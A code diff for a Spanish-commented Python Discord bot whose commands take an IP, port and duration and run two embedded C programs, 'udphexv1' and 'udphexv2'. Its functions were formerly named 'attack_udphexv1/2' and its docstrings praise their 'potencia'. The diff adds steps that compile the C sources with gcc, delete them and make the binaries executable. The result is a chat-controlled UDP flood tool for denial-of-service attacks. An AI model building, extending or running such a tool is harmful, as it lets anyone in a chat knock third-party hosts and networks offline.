@@ -4,8 +4,8 @@ import subprocess
 import os
 
 # Definir los nombres de los scripts
-UDP_HEX_V1_SCRIPT = "udphexv1"
-UDP_HEX_V2_SCRIPT = "udphexv2"
+UDP_HEX_V1_SCRIPT = "./udphexv1"
+UDP_HEX_V2_SCRIPT = "./udphexv2"
 
 # Crear el bot con intents
 intents = discord.Intents.default()
@@ -36,7 +36,7 @@ def get_token():
 
 # Comando para ejecutar udphexv1
 @bot.command()
-async def attack_udphexv1(ctx, ip, port, time):
+async def udphexv1(ctx, ip, port, time):
     """UDPHexV1 Que consume una gran cantidad de recursos"""
     try:
         # Construir el comando para ejecutar el script
@@ -62,7 +62,7 @@ async def attack_udphexv1(ctx, ip, port, time):
 
 # Comando para ejecutar udphexv2
 @bot.command()
-async def attack_udphexv2(ctx, ip, port, time):
+async def udphexv2(ctx, ip, port, time):
     """UDPHexV2 Optimizado con mayor potencia pero menos consumidor de la cpu"""
     try:
         # Construir el comando para ejecutar el script
@@ -89,7 +89,7 @@ async def attack_udphexv2(ctx, ip, port, time):
 # Ejecutar el bot
 if __name__ == "__main__":
     # Guardar los scripts en archivos (udphexv1 y udphexv2)
-    with open(UDP_HEX_V1_SCRIPT, "w") as f:
+    with open("udphexv1.c", "w") as f:
         f.write("""#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -377,7 +377,8 @@ int main(int argc, char *argv[]) {
     
     return 0;
 }""")
-    with open(UDP_HEX_V2_SCRIPT, "w") as f:
+
+    with open("udphexv2.c", "w") as f:
         f.write("""#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -476,10 +477,28 @@ int main(int argc, char *argv[]){
     return 0;
 }""")
 
+    # Compilar los programas C
+    try:
+        print("Compilando udphexv1...")
+        subprocess.run(["gcc", "-O3", "-pthread", "-o", "udphexv1", "udphexv1.c"], check=True)
+        print("Compilando udphexv2...")
+        subprocess.run(["gcc", "-O3", "-pthread", "-o", "udphexv2", "udphexv2.c"], check=True)
+        print("Compilación completada!")
+        
+        # Limpiar archivos .c
+        os.remove("udphexv1.c")
+        os.remove("udphexv2.c")
+        
+    except subprocess.CalledProcessError as e:
+        print(f"Error al compilar: {e}")
+        print("Asegúrate de tener gcc instalado")
+    except Exception as e:
+        print(f"Error: {e}")
+
     # Dar permisos de ejecución a los scripts (en sistemas Unix)
     try:
-        os.chmod(UDP_HEX_V1_SCRIPT, 0o755)
-        os.chmod(UDP_HEX_V2_SCRIPT, 0o755)
+        os.chmod("udphexv1", 0o755)
+        os.chmod("udphexv2", 0o755)
     except OSError as e:
         print(f"Error al cambiar permisos: {e}")
         print("Asegúrate de ejecutar esto en un entorno compatible con chmod (Linux/macOS) o ajusta los permisos manualmente.")
